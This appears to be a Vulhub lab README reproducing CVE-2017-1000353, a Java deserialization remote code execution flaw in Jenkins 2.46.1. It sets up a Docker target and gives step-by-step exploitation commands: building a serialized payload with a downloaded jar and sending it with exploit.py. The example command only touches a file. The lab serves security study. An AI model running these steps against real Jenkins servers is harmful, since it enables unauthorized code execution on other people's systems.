# Jenkins Remote Code Execution (CVE-2017-1000353)

[中文版本(Chinese version)](README.zh-cn.md)

Jenkins is a popular open-source automation server.

Jenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an unauthenticated remote code execution. An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java `SignedObject` object to the Jenkins CLI, that would be deserialized using a new `ObjectInputStream`, bypassing the existing blacklist-based protection mechanism.

## Environment Setup

Execute the following command to start Jenkins 2.46.1:

```
docker compose up -d
```

After the server is fully started, visit `http://your-ip:8080` to access Jenkins. No manual installation is required.

## Vulnerability Reproduction

The exploitation process involves two steps: generating a malicious serialized payload and sending it to the target Jenkins server.

First, download the [CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar) tool to generate the payload. This tool will create a serialized object containing our command:

```bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
# jenkins_poc.ser is the output file name
# "touch ..." is the command to be executed
```

After execution, a file named `jenkins_poc.ser` will be generated containing the serialized payload.

Next, download the [exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py) script and execute it with Python 3 to send the payload:

```bash
python exploit.py http://your-ip:8080 jenkins_poc.ser
```

To verify the successful exploitation, check inside the container for the created file:

The presence of `/tmp/success` file confirms that the remote code execution was successful.
